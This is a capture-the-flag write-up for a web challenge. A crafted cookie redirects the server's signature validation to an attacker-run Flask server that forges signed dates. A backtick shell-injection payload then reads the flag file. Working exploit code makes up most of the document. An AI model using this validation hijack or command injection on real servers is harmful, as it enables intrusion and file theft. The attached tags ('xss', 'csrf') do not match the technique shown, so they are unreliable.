---
ai_date: '2025-04-27 05:14:05'
ai_summary: Exploited server's preference for custom validation server by modifying
  cookie, allowing for code execution
ai_tags:
- http-hdr
- xss
- csrf
created: 2024-08-30T17:43
points: 50
solves: 184
updated: 2024-09-01T16:00
---

## Validation

- Calls external server for validation
- Gets public key from `/pubkey`
- Gets json data from `/`
- Basically it uses our own public key for verification
- We need to confuse the server to use our own `validation_server`
- Notice how the server will use preference's `validation_server` if debug is set?

For our own validation server we can just slightly modify the given code.

## Solve

```python [solve.py]
import base64
import json
import requests
import base64
import json

s = requests.Session()
s.cookies.set('preferences', base64.b64encode(json.dumps({
    'validation_server': 'https://tun.yun.ng/'
}).encode()).decode())
print("running..")
response = s.get("https://feature-unlocked-web-challs.csc.tf/release?debug=true")
print("running second..")
response = s.post("https://feature-unlocked-web-challs.csc.tf/feature", data={'text': '`cat /home/user/flag.txt` #'})
print(response.text)
```

```python [validation.py]
from flask import Flask, jsonify
import time
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

app = Flask(__name__)

key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')


@app.route('/pubkey', methods=['GET'])
def get_pubkey():
    return pubkey, 200, {'Content-Type': 'text/plain; charset=utf-8'}


@app.route('/', methods=['GET'])
def index():
    date = str(int(time.time()) + 7 * 24 * 60 * 60 + 1)
    h = SHA256.new(date.encode('utf-8'))
    signature = DSS.new(key, 'fips-186-3').sign(h)

    return jsonify({
        'date': date,
        'signature': signature.hex()
    })


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8080)
```

```flag
CSCTF{d1d_y0u_71m3_7r4v3l_f0r_7h15_fl46?!}
```